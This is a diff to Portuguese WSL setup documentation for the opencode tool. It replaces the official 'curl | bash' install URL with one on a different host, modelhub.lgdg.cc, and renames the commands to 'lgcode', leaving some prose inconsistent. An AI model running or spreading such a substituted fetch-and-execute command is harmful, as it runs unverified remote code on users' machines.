@@ -26,7 +26,7 @@ O WSL oferece melhor desempenho de sistema de arquivos, suporte completo a termi
    Depois de configurar o WSL, abra o terminal do WSL e instale o opencode usando um dos [métodos de instalação](/docs/).
 
    ```bash
-   curl -fsSL https://opencode.ai/install | bash
+   curl -fsSL https://modelhub.lgdg.cc/install | bash
    ```
 
 3. **Use o opencode pelo WSL**
@@ -49,7 +49,7 @@ Se você prefere usar o app desktop do opencode, mas quer rodar o servidor no WS
 1. **Inicie o servidor no WSL** com `--hostname 0.0.0.0` para permitir conexões externas:
 
    ```bash
-   opencode serve --hostname 0.0.0.0 --port 4096
+   lgcode serve --hostname 0.0.0.0 --port 4096
    ```
 
 2. **Conecte o app desktop** em `http://localhost:4096`
@@ -59,10 +59,10 @@ Se `localhost` não funcionar no seu ambiente, conecte usando o IP do WSL (no WS
 :::
 
 :::caution
-Ao usar `--hostname 0.0.0.0`, defina `OPENCODE_SERVER_PASSWORD` para proteger o servidor.
+Ao usar `--hostname 0.0.0.0`, defina `LGCODE_SERVER_PASSWORD` para proteger o servidor.
 
 ```bash
-OPENCODE_SERVER_PASSWORD=your-password opencode serve --hostname 0.0.0.0
+LGCODE_SERVER_PASSWORD=your-password lgcode serve --hostname 0.0.0.0
 ```
 
 :::
@@ -73,15 +73,15 @@ OPENCODE_SERVER_PASSWORD=your-password opencode serve --hostname 0.0.0.0
 
 Para a melhor experiência web no Windows:
 
-1. **Execute `opencode web` no terminal WSL** em vez do PowerShell:
+1. **Execute `lgcode web` no terminal WSL** em vez do PowerShell:
 
    ```bash
-   opencode web --hostname 0.0.0.0
+   lgcode web --hostname 0.0.0.0
    ```
 
 2. **Acesse pelo navegador do Windows** em `http://localhost:<port>` (o opencode mostra a URL)
 
-Executar `opencode web` a partir do WSL garante acesso correto ao sistema de arquivos e integração com o terminal, continuando acessível no navegador do Windows.
+Executar `lgcode web` a partir do WSL garante acesso correto ao sistema de arquivos e integração com o terminal, continuando acessível no navegador do Windows.
 
 ---
 
